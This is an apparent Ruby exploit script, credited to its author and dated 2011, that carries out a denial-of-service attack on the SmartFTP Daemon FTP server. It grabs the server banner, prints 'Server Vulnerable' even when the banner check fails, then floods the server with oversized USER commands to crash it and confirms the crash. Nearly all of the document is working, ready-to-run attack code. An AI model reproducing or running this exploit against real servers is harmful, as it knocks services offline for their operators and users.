#!/usr/bin/ruby
#
#
#
#       xxx     xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx
#        xxx   xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx  
#         xxx xxx         xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx                    
#          xxxxx          xxx       xxx      xxx       xxx      xxx       xxx           xxxxxx   
#           xxx           xxx       xxx      xxx       xxx      xxx       xxx          xxxxxxxx  xxxxxxxx  xxxxxxxxx
#         xxxxxx          xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx    xx  xx
#        xxx  xxx         xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx xxxx   xx  xxxxx
#      xxx     xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx   xxx    xxxxxxxx  xx   xx   xx     xx
#     xxx       xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx    xxx     xxxxxx   xx    xx  xxxxxxxxx
#
#
#
#
#[+]Exploit Title: Exploit Denial of Service SmartFTP Daemon
#[+]Date: 09\04\2011
#[+]Author: C4SS!0 G0M3S || Cassio Gomes
#[+]Software Link: http://filestore.softwaredownloadwebsite.com/e9/553237-smartftpd-setup.exe
#[+]Version: v0.2
#[+]Tested on: WIN-XP SP3 
#[+]CVE: N/A
#[+]Language: Ruby
#
#
#Modo de Uso:
#
#Para que o Expoit funcione o servidor vulneravel tem que ter 
#clicado na opcao do raio(um opcoes q provoca o crash no programa)
#
#
#Criado por C4SS!0 G0M3S || Cassio Gomes
#E-mail Louredo_@hotmail.com
#Site x000.org
#
#

require 'socket'


def len(str) #EU USO ISSO POR Q E MAIS PARECIDO COM PYTHON
        return str.length
end

sys=`ver`
if sys=~/Windows/
     system("cls")
	 system("color 4f")
else
     system("clear")
end
def usage()
     print """
	 
	==============================================================
	==============================================================
        ====================Exploit DOS SmartFTP Daemon===============
        ====================Criado por C4SS!0 G0M3S===================
        ====================E-mail Louredo_@hotmail.com===============
	====================Site x000.org/============================
	==============================================================
	==============================================================
	
"""
end

if len(ARGV)!=2
     usage()
	 print "\t\t[-]Usege: ruby #{$0} <host> <porta>\n"
	 print "\t\t[-]Exemple: ruby #{$0} 192.168.1.2 21\n"
	 exit
end

host = ARGV[0]
porta = ARGV[1].to_i

usage()
print "\t\t[+]Connecting to Server #{ARGV[0]}...\n\n"
sleep(1)
begin
sock = TCPSocket.new(host,porta)
banner = sock.recv(2000)
sock.close
print "\t\t[+]Checking if server is vulnerable\n\n"
sleep(1)
rescue
print "\t\t[+]Error to Connect to Server #{host}\n"
exit
end

unless banner=~/Smart-FTP-\D v0\.1/
     print "\t\t[+]Server Not Vulnerable:(\n"
	 sleep(1)
end
print "\t\t[+]Server Vulnerable:)\n\n"
sleep(1)
buf=  "A" * (4700/3)
i=0
print "\t\t[+]Running Attack DOS\n\n"
sleep(1)
while i<50
begin
s = TCPSocket.new(host,porta)
s.recv(2000)
s.puts "USER #{buf}\r\n"
s.close
i+=1
rescue
i=50
end
end
print "\t\t[+]Attack DOS Successfully Implemented\n\n"
sleep(1)
print "\t\t[+]Checking if the exploit works\n\n"
sleep(1)
begin
so = TCPSocket.new(host,porta)
so.close
print "\t\t[+]I'm Sorry, But Not Worked Exploit:(\n"
rescue
print "\t\t[+]Exploit worked with Success:)\n"
exit
end